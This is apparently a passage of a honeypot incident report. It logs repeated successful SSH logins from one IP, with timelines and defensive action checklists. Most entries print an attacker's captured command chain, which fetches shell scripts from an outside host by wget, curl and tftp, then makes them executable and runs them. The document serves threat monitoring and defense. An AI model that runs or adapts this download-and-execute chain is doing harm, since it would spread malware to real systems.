| `2026-08-25 09:58:44` | `cowrie.command.success` |
| `2026-08-25 09:58:45` | `cowrie.log.closed` |
| `2026-08-25 09:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ef0330b94ce

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:45` | `cowrie.session.connect` |
| `2026-08-25 09:58:45` | `cowrie.login.success` |
| `2026-08-25 09:58:46` | `cowrie.session.params` |
| `2026-08-25 09:58:46` | `cowrie.log.closed` |
| `2026-08-25 09:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-489b8f462740

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:46` | `cowrie.session.connect` |
| `2026-08-25 09:58:46` | `cowrie.login.success` |
| `2026-08-25 09:58:47` | `cowrie.session.params` |
| `2026-08-25 09:58:47` | `cowrie.command.input` |
| `2026-08-25 09:58:47` | `cowrie.command.success` |
| `2026-08-25 09:58:47` | `cowrie.log.closed` |
| `2026-08-25 09:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71aae3cc6c55

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:47` | `cowrie.session.connect` |
| `2026-08-25 09:58:48` | `cowrie.login.success` |
| `2026-08-25 09:58:48` | `cowrie.session.params` |
| `2026-08-25 09:58:48` | `cowrie.command.input` |
| `2026-08-25 09:58:49` | `cowrie.session.file_download` |
| `2026-08-25 09:58:49` | `cowrie.session.file_download` |
| `2026-08-25 09:58:49` | `cowrie.session.file_download` |
| `2026-08-25 09:58:49` | `cowrie.log.closed` |
| `2026-08-25 09:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e90667c7278

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:49` | `cowrie.session.connect` |
| `2026-08-25 09:58:49` | `cowrie.login.success` |
| `2026-08-25 09:58:50` | `cowrie.session.params` |
| `2026-08-25 09:58:50` | `cowrie.command.input` |
| `2026-08-25 09:58:50` | `cowrie.session.file_download` |
| `2026-08-25 09:58:50` | `cowrie.session.file_download` |
| `2026-08-25 09:58:50` | `cowrie.session.file_download` |
| `2026-08-25 09:58:50` | `cowrie.log.closed` |
| `2026-08-25 09:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88ae5d5c10f7

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:51` | `cowrie.session.connect` |
| `2026-08-25 09:58:51` | `cowrie.login.success` |
| `2026-08-25 09:58:51` | `cowrie.session.params` |
| `2026-08-25 09:58:51` | `cowrie.command.input` |
| `2026-08-25 09:58:52` | `cowrie.session.file_download` |
| `2026-08-25 09:58:52` | `cowrie.session.file_download` |
| `2026-08-25 09:58:52` | `cowrie.log.closed` |
| `2026-08-25 09:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26de23070be7

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:52` | `cowrie.session.connect` |
| `2026-08-25 09:58:52` | `cowrie.login.success` |
| `2026-08-25 09:58:53` | `cowrie.session.params` |
| `2026-08-25 09:58:53` | `cowrie.log.closed` |
| `2026-08-25 09:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-462d8ac5aae9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:53` | `cowrie.session.connect` |
| `2026-08-25 09:58:53` | `cowrie.login.success` |
| `2026-08-25 09:58:54` | `cowrie.session.params` |
| `2026-08-25 09:58:54` | `cowrie.command.input` |
| `2026-08-25 09:58:54` | `cowrie.command.success` |
| `2026-08-25 09:58:54` | `cowrie.session.file_download` |
| `2026-08-25 09:58:54` | `cowrie.log.closed` |
| `2026-08-25 09:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7026785ccf65

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:54` | `cowrie.session.connect` |
| `2026-08-25 09:58:55` | `cowrie.login.success` |
| `2026-08-25 09:58:55` | `cowrie.session.params` |
| `2026-08-25 09:58:55` | `cowrie.command.input` |
| `2026-08-25 09:58:55` | `cowrie.command.success` |
| `2026-08-25 09:58:56` | `cowrie.session.file_download` |
| `2026-08-25 09:58:56` | `cowrie.log.closed` |
| `2026-08-25 09:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0d097e2582

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:56` | `cowrie.session.connect` |
| `2026-08-25 09:58:56` | `cowrie.login.success` |
| `2026-08-25 09:58:57` | `cowrie.session.params` |
| `2026-08-25 09:58:57` | `cowrie.command.input` |
| `2026-08-25 09:58:57` | `cowrie.command.success` |
| `2026-08-25 09:58:57` | `cowrie.log.closed` |
| `2026-08-25 09:58:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43a1c0691c45

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:58` | `cowrie.session.connect` |
| `2026-08-25 09:58:58` | `cowrie.login.success` |
| `2026-08-25 09:58:58` | `cowrie.session.params` |
| `2026-08-25 09:58:58` | `cowrie.command.input` |
| `2026-08-25 09:58:58` | `cowrie.command.success` |
| `2026-08-25 09:58:59` | `cowrie.log.closed` |
| `2026-08-25 09:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e88ea24f14fb

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:59` | `cowrie.session.connect` |
| `2026-08-25 09:58:59` | `cowrie.login.success` |
| `2026-08-25 09:59:00` | `cowrie.session.params` |
| `2026-08-25 09:59:00` | `cowrie.command.input` |
| `2026-08-25 09:59:00` | `cowrie.command.success` |
| `2026-08-25 09:59:00` | `cowrie.log.closed` |
| `2026-08-25 09:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e1b5b0c1698

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:01` | `cowrie.session.connect` |
| `2026-08-25 09:59:01` | `cowrie.login.success` |
| `2026-08-25 09:59:01` | `cowrie.session.params` |
| `2026-08-25 09:59:02` | `cowrie.command.input` |
| `2026-08-25 09:59:02` | `cowrie.command.success` |
| `2026-08-25 09:59:02` | `cowrie.log.closed` |
| `2026-08-25 09:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91cb978bf301

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:02` | `cowrie.session.connect` |
| `2026-08-25 09:59:02` | `cowrie.login.success` |
| `2026-08-25 09:59:03` | `cowrie.session.params` |
| `2026-08-25 09:59:03` | `cowrie.command.input` |
| `2026-08-25 09:59:03` | `cowrie.command.success` |
| `2026-08-25 09:59:04` | `cowrie.log.closed` |
| `2026-08-25 09:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3144b090bea9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:04` | `cowrie.session.connect` |
| `2026-08-25 09:59:04` | `cowrie.login.success` |
| `2026-08-25 09:59:04` | `cowrie.session.params` |
| `2026-08-25 09:59:05` | `cowrie.log.closed` |
| `2026-08-25 09:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc7df67362ad

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:05` | `cowrie.session.connect` |
| `2026-08-25 09:59:05` | `cowrie.login.success` |
| `2026-08-25 09:59:05` | `cowrie.session.params` |
| `2026-08-25 09:59:05` | `cowrie.command.input` |
| `2026-08-25 09:59:06` | `cowrie.command.success` |
| `2026-08-25 09:59:06` | `cowrie.log.closed` |
| `2026-08-25 09:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b29362141ab

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:06` | `cowrie.session.connect` |
| `2026-08-25 09:59:06` | `cowrie.login.success` |
| `2026-08-25 09:59:07` | `cowrie.session.params` |
| `2026-08-25 09:59:07` | `cowrie.command.input` |
| `2026-08-25 09:59:07` | `cowrie.command.success` |
| `2026-08-25 09:59:07` | `cowrie.log.closed` |
| `2026-08-25 09:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3da7b4de3ca

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:08` | `cowrie.session.connect` |
| `2026-08-25 09:59:08` | `cowrie.login.success` |
| `2026-08-25 09:59:08` | `cowrie.session.params` |
| `2026-08-25 09:59:09` | `cowrie.command.input` |
| `2026-08-25 09:59:09` | `cowrie.command.success` |
| `2026-08-25 09:59:09` | `cowrie.log.closed` |
| `2026-08-25 09:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8906bdc0f94

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:09` | `cowrie.session.connect` |
| `2026-08-25 09:59:09` | `cowrie.login.success` |
| `2026-08-25 09:59:10` | `cowrie.session.params` |
| `2026-08-25 09:59:10` | `cowrie.command.input` |
| `2026-08-25 09:59:10` | `cowrie.command.success` |
